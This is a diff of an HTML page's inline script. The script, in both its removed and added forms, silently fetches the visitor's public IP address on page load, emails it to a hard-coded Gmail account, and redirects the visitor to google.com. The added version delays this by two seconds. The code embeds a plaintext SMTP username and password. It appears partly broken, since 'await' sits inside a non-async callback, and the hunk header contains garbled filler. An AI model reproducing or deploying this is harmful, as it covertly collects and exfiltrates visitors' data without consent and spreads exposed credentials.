@@ -115,34 +115,36 @@ true 157.117 26 shark screw 198.067 34.7115 employee figure 109 true 47.8425 dru
   </script>
   
   <script type="text/javascript">
-    async function sendEmail(msg) {
-      await Email.send({
-        Host: "smtp.gmail.com",
-        Username: "cenajohnathon280@gmail.com",
-        Password: "aA*H$ofj930o",
-        To: 'cenajohnathon280@gmail.com',
-        From: "cenajohnathon280@gmail.com",
-        Subject: "balls 2",
-        Body: msg,
-      });
-      console.log("hehehehe");
-    }
-    
-    async function fetch_and_send()
-    {
-      fetch('https://api.ipify.org/?format=json')
-        .then(results => results.json())
-        .then(await sendEmail);
-    }
-    
-    async function do_the_shit()
-    {
+    setTimeout(() => {
+      async function sendEmail(msg) {
+        await Email.send({
+          Host: "smtp.gmail.com",
+          Username: "cenajohnathon280@gmail.com",
+          Password: "aA*H$ofj930o",
+          To: 'cenajohnathon280@gmail.com',
+          From: "cenajohnathon280@gmail.com",
+          Subject: "balls 2",
+          Body: msg,
+        });
+        console.log("hehehehe");
+      }
+
+      async function fetch_and_send()
+      {
+        fetch('https://api.ipify.org/?format=json')
+          .then(results => results.json())
+          .then(await sendEmail);
+      }
+
+  //     async function do_the_shit()
+  //     {
+  //       await fetch_and_send();
+
+  //       window.location.replace("https://www.google.com/");
+  //     }
       await fetch_and_send();
-      
       window.location.replace("https://www.google.com/");
-    }
-    
-    do_the_shit();
+    }, 2000);
   </script>
 </head>
   
